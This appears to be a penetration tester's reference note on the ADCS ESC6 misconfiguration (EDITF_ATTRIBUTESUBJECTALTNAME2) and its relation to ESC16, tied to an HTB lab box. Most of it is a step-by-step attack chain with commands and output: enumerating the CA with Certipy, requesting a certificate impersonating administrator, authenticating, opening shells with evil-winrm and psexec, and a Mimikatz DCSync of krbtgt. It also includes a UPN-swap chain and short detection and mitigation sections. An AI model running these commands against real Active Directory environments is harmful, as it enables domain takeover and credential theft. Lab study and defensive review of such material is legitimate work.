---
title: "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag"
description: "certutil -config \"CA-SERVER\\DOMAIN-CA\" -getreg policy\\EditFlags"
category: active-directory
tags: ["active-directory", "adcs"]
tools: ["Impacket", "Mimikatz", "Rubeus", "Certipy", "BloodHound"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag.md"
---
# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | CA-Level Misconfiguration |
| **Difficulty** | Low (pre-patch) / Blocked (post-patch) |
| **Pre-requisites** | `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled on CA |
| **Tools** | Certipy, Certify.exe, certutil |
| **OPSEC Noise** | Low — standard cert request |
| **One-liner** | CA-level flag that allows user-specified SANs on ANY template, bypassing template-level restrictions. Largely patched by KB5014754. |

***

### Quick Check for EDITF Flag

```bash
# From Windows
certutil -config "CA-SERVER\DOMAIN-CA" -getreg policy\EditFlags
# Look for EDITF_ATTRIBUTESUBJECTALTNAME2 in the output

# From Linux (via certipy)
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -stdout | grep -i 'user specified san'
```

***

## What Is ESC6?

ESC6 is a **CA-level misconfiguration**, not a template-level one. This is a critical distinction from ESC1–4. With ESC1 you needed a template that had `ENROLLEE_SUPPLIES_SUBJECT` set. With ESC6, **that flag on the template doesn't matter at all** — because the CA itself has been told to accept a user-specified SAN on *any* certificate request, regardless of what the template says.

The flag responsible is `EDITF_ATTRIBUTESUBJECTALTNAME2`, stored in the CA's registry at `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy`. When this flag is set, **every single template with Client Authentication EKU that low-priv users can enroll in becomes an ESC1 vector** — including the default built-in `User` template.

Think of it like this: ESC1 is a misconfigured door. ESC6 is the master key that opens every door in the building simultaneously.

***

## ⚠️ Critical Note — Patched After May 2022

Microsoft released a patch in **May 2022** (KB5014754) that broke the default exploit path for ESC6. After this patch, even if `EDITF_ATTRIBUTESUBJECTALTNAME2` is set, the CA **enforces strong certificate mapping** and will reject certificates where the SAN doesn't match the requester's actual identity for Kerberos authentication.

| Environment State | ESC6 Exploitable? |
|---|---|
| Unpatched / pre-May 2022 | ✅ Full ESC6 as described |
| Patched but `StrongCertificateBindingEnforcement = 0` | ✅ Still works |
| Patched but `StrongCertificateBindingEnforcement = 1` (default post-patch) | ⚠️ Partially blocked — Kerberos auth may fail |
| Patched and `StrongCertificateBindingEnforcement = 2` (enforced) | ❌ Blocked |
| ESC16 present (Security Extension disabled) | ✅ ESC6-like attack still works via UPN swap — as seen in your Fluffy box |

> 💡 This is exactly why your Fluffy box showed `ESC16` — the security extension was disabled, which in modern environments is the **post-patch equivalent of ESC6**. The two are closely related in concept and exploit path.

***

## Required Conditions

| Condition | Where to Check |
|-----------|----------------|
| `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set on CA | CA output: `User Specified SAN: Enabled` |
| `Request Disposition: Issue` (no manual approval) | CA output: `Request Disposition: Issue` |
| At least one template with Client Auth EKU enrollable by low-priv users | Any template with `Client Authentication: True` + `Enrollment Rights: Domain Users` |

***

## Step 0 — Enumeration

```bash
# Standard scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# With hash
certipy-ad find -u 'lowpriv@domain.htb' -hashes :NTHASH \
  -dc-ip $TARGET -vulnerable -stdout
```

### What Vulnerable ESC6 Output Looks Like

The vulnerability shows up at the **CA level**, not the template level:

```
Certificate Authorities
  0
    CA Name                             : DOMAIN-CA
    DNS Name                            : DC01.domain.htb
    Certificate Subject                 : CN=DOMAIN-CA, DC=domain, DC=htb
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled       ← THE key flag
    Request Disposition                 : Issue         ← No manual approval
    Enforce Encryption for Requests     : Disabled
    Permissions
      Access Rights
        ManageCa      : DOMAIN\Domain Admins
        ManageCertificates: DOMAIN\Domain Admins
        Enroll        : DOMAIN\Authenticated Users

    [!] Vulnerabilities
      ESC6 : Enrollees can specify SAN and Request Disposition is set to Issue.
             Does not work after May 2022
```

> 💡 Certipy explicitly warns `Does not work after May 2022` in the output. Don't ignore this — check the registry value before investing time in the attack.

***

## Checking the Registry (if you have access)

```bash
# From Linux via Impacket
reg.py 'domain/administrator:Password123!'@$TARGET query \
  -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\DOMAIN-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy'

# Look for:
# EditFlags    REG_DWORD    0x00014...
# Bit 0x00040000 = EDITF_ATTRIBUTESUBJECTALTNAME2 = flag is SET
```

```powershell
# From Windows on the CA server
reg query "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"

# Also check patch status
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
# 0x0 = not enforced (ESC6 works)
# 0x1 = partial enforcement (may work)
# 0x2 = fully enforced (blocked)
```

***

## Full Attack Chain — Linux (Certipy)

ESC6's exploit is **identical to ESC1** in commands — the difference is you don't need a specially misconfigured template. Any template with Client Auth works, including the built-in `User` template.

### Step 1 — Request cert with injected SAN against ANY auth-capable template

```bash
# Using the built-in User template — almost always available
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'User' \
  -upn 'administrator@domain.htb'

# Output: administrator.pfx

# If User template doesn't work, try Machine, or any other
# Client Auth template visible in certipy output
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'Machine' \
  -upn 'administrator@domain.htb'
```

**Expected output:**
```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 22
[*] Got certificate with UPN 'administrator@domain.htb'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'administrator.pfx'
```

***

### Step 2 — Authenticate

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET

# Output: administrator.ccache + NT hash
```

***

### Step 3 — Shell

```bash
# Kerberos TGT
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DC01.domain.htb
evil-winrm -i DC01.domain.htb -r domain.htb

# Pass-the-Hash
evil-winrm -i $TARGET -u administrator -H <NTHASH>
psexec.py administrator@$TARGET -hashes :NTHASH
```

***

## Full Attack Chain — Windows (Certify.exe + Rubeus)

```powershell
# Step 1: Request cert using any Client Auth template
.\Certify.exe request /ca:DC01.domain.local\DOMAIN-CA /template:User /altname:administrator
# Copy cert.pem, convert:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# Leave password blank

# Step 2: Get TGT + NT hash
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap

# Step 3: Inject and use
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:<base64ticket>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

***

## How to SET the Flag (Red Team / Lab Setup)

If you have CA admin rights and want to demonstrate the vulnerability in a lab:

```powershell
# On the CA server — SET the flag
certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc

# To UNSET (remediation)
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

***

## ESC6 vs ESC1 — Key Differences

| | ESC1 | ESC6 |
|---|---|---|
| **Where misconfiguration lives** | Certificate Template | **Certificate Authority** |
| **Flag responsible** | `ENROLLEE_SUPPLIES_SUBJECT` on template | `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA |
| **Templates affected** | Only the specific misconfigured template | **Every** Client Auth template on that CA |
| **Requires specific template** | ✅ Must find the ESC1 template | ❌ Any Client Auth template works |
| **Post-May 2022 patch** | Still works (template-level) | ⚠️ May be blocked |
| **Certipy `-upn` flag** | ✅ Same | ✅ Same |
| **Modern equivalent** | — | **ESC16** (Security Extension disabled) |

***

## ESC6 → ESC16 Connection (Relevant to Your Fluffy Box)

Your Fluffy box had `ESC16: Security Extension is disabled`. This is the **post-patch spiritual successor to ESC6**. The exploit path is almost identical — but instead of relying on the CA accepting a user-specified SAN at enrollment time, you:

1. Find an account you have `GenericWrite` over (e.g., `ca_svc`)
2. **Modify that account's UPN** to match the target (e.g., `administrator`)
3. Request a cert from **any Client Auth template** using that account
4. **Restore the UPN** immediately after
5. Authenticate — the cert was issued with `UPN: administrator` embedded

```bash
# What you did on Fluffy — ESC16 chain
certipy-ad account -u winrm_svc@fluffy.htb -hashes ... \
  -user ca_svc -upn administrator update           # 1. Swap UPN

certipy-ad req -u ca_svc -hashes ... \
  -ca fluffy-DC01-CA -template User                # 2. Request cert

certipy-ad account -u winrm_svc@fluffy.htb -hashes ... \
  -user ca_svc -upn ca_svc@fluffy.htb update       # 3. Restore UPN

certipy-ad auth -pfx administrator.pfx \
  -u administrator -domain fluffy.htb -dc-ip $TARGET  # 4. Auth
```

This is covered fully in the ESC16 section later in the series.

***

## Detection Indicators

- **Certipy / Certify output:** `User Specified SAN: Enabled` in CA section
- **Registry:** `EDITF_ATTRIBUTESUBJECTALTNAME2` bit set in `EditFlags` value
- **Event ID 4887** — Certificate issued where Subject differs from requester
- **Microsoft Defender for Identity** — Has a built-in detection for `ESC6` flagged as "Edit vulnerable Certificate Authority setting"

***

## Mitigation

- **Unset the flag** immediately on any CA where it is enabled:
  ```powershell
  certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
  net stop certsvc && net start certsvc
  ```
- **Enforce strong certificate binding** — set `StrongCertificateBindingEnforcement = 2` in the KDC registry key after ensuring all certificates have been re-issued with objectSID extensions
- **Apply KB5014754** if not already patched — this forces the DC to require the objectSID extension in certificates for Kerberos auth
- **Audit CA configuration regularly** — include CA-level flags in your ADCS security reviews, not just template-level settings

***

## OPSEC Considerations

| Action | Log Generated | Noise Level |
|--------|--------------|-------------|
| Certipy enumeration | LDAP queries | 🟢 Low |
| certutil flag check | Event ID 4688 (process creation) | 🟢 Low |
| Certificate request | Event ID 4886/4887 | 🟢 Low |

> 💡 ESC6 is low noise because it uses standard enrollment. However, post-patch, it produces warning events when the KDC detects a SAN that doesn't match the requester.

Sources
 Active Directory Certificate Attack (ADCS – ESC6) - RBT Security https://www.rbtsec.com/blog/active-directory-certificate-attack-adcs-esc6/
 ESC6 - Pentest Everything - GitBook https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc6
 Common ADCS Vulnerabilities: Logging, Exploitation ... - Lares Labs https://labs.lares.com/adcs-exploits-investigations-pt2/
 Certificates - Microsoft Defender for Identity https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates
 ADCS Attack Paths in BloodHound — Part 3 - Blog - SpecterOps https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-3-33efb00856ac
 06 ‐ Privilege Escalation · ly4k/Certipy Wiki - GitHub https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
 AD CS Security: Understanding and Exploiting ESC Techniques https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/
 Attacking AD CS ESC Vulnerabilities Using Metasploit https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html
 AD CS Misconfigurations - Structured https://structured.com/blog/ad-cs-misconfigurations/
 Certificate templates | The Hacker Recipes https://www.thehacker.recipes/ad/movement/adcs/certificate-templates
